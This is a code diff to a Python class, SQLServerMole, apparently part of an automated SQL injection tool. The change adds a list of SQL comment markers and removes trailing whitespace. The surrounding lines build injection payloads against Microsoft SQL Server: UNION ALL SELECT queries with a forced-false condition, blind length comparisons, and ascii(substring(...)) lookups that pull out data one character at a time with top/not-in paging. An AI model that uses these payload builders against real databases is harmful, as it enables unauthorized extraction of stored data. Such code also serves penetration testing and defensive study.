@@ -33,6 +33,7 @@ class SQLServerMole(DbmsMole):
     integer_field_finger = 'ascii(char(58)) + (len(' + DbmsMole.char_concat("1111111") + ') * 190) + (ascii(char(73)) * 31337)'
     integer_field_finger_result = '2288989'
     integer_out_delimiter = '3133707'
+    comment_list = ['--', '/*', ' ']
 
     def to_string(self, data):
         return DbmsMole.char_concat(data)
@@ -91,7 +92,7 @@ class SQLServerMole(DbmsMole):
         fields_joined = self._join_fields_with_table(fields,table)
         query = ' and {op_par}' + str(value) + ' ' + operator + ' (select len({field})'.format(field=self._concat_fields(fields))
         if len(table) > 0:
-            query += (' from (select top 1 {fields_comma} from {table} where {field} not in (select top {off} {field} ' + 
+            query += (' from (select top 1 {fields_comma} from {table} where {field} not in (select top {off} {field} ' +
                 'from {table} where {where} order by 1 ASC) and {where} order by 1 ASC) as T)').format(
                 table=table,field=self._concat_fields(fields_joined),fields_comma=','.join(fields_joined),
                 where=self.parse_condition(where),off=offset)
@@ -176,8 +177,8 @@ class SQLServerMole(DbmsMole):
         query += ','.join(query_list)
         fields = self._join_fields_with_table(fields, table_name)
         if len(table_name) > 0:
-            query += (" from (select top 1 " + ','.join(fields) + " from " + table_name + " where " + self._concat_fields(fields) +  
-                      " not in (select top " + str(offset) + " " + self._concat_fields(fields) + " from " + table_name + " where " + 
+            query += (" from (select top 1 " + ','.join(fields) + " from " + table_name + " where " + self._concat_fields(fields) +
+                      " not in (select top " + str(offset) + " " + self._concat_fields(fields) + " from " + table_name + " where " +
                       where + " order by 1 ASC) and " + where + " order by 1 ASC) as T")
         return query
 
@@ -196,14 +197,14 @@ class SQLServerMole(DbmsMole):
         query = " and 1 = 0 UNION ALL SELECT "
         query_list = list(self.finger._query)
         query_list[injectable_field] = ("cast(cast(" + SQLServerMole.integer_out_delimiter + " as varchar(10))+" +
-                                        "cast(len(" + self._concat_fields(fields) + ") as varchar(30))+cast(" + 
+                                        "cast(len(" + self._concat_fields(fields) + ") as varchar(30))+cast(" +
                                         SQLServerMole.integer_out_delimiter + " as varchar(10)) as bigint)")
         where = self.parse_condition(where)
         query += ','.join(query_list)
         fields = self._join_fields_with_table(fields, table_name)
         if len(table_name) > 0:
-            query += (" from (select top 1 " + ','.join(fields) + " from " + table_name + " where " + self._concat_fields(fields) +  
-                      " not in (select top " + str(offset) + " " + self._concat_fields(fields) + " from " + table_name + " where " + 
+            query += (" from (select top 1 " + ','.join(fields) + " from " + table_name + " where " + self._concat_fields(fields) +
+                      " not in (select top " + str(offset) + " " + self._concat_fields(fields) + " from " + table_name + " where " +
                       where + " order by 1 ASC) and " + where + " order by 1 ASC) as T")
         return query
 
@@ -211,15 +212,15 @@ class SQLServerMole(DbmsMole):
         query = " and 1 = 0 UNION ALL SELECT "
         query_list = list(self.finger._query)
         query_list[injectable_field] = ("cast(cast(" + SQLServerMole.integer_out_delimiter + " as varchar(10))+" +
-                                        "cast(ascii(substring(" + self._concat_fields(fields) + "," + str(index) + ",1)) as varchar(30))+cast(" + 
+                                        "cast(ascii(substring(" + self._concat_fields(fields) + "," + str(index) + ",1)) as varchar(30))+cast(" +
                                         SQLServerMole.integer_out_delimiter + " as varchar(10)) as bigint)")
         where = self.parse_condition(where)
         query += ','.join(query_list)
         fields = self._join_fields_with_table(fields, table_name)
         if len(table_name) > 0:
-            query += (" from (select top 1 " + ','.join(fields) + " from " + table_name + " where " + 
-                      self._concat_fields(fields) +  " not in (select top " + str(offset) + " " + 
-                      self._concat_fields(fields) + " from " + table_name + " where " + where + " order by 1 ASC) and " + 
+            query += (" from (select top 1 " + ','.join(fields) + " from " + table_name + " where " +
+                      self._concat_fields(fields) +  " not in (select top " + str(offset) + " " +
+                      self._concat_fields(fields) + " from " + table_name + " where " + where + " order by 1 ASC) and " +
                       where + " order by 1 ASC) as T")
         return query
 
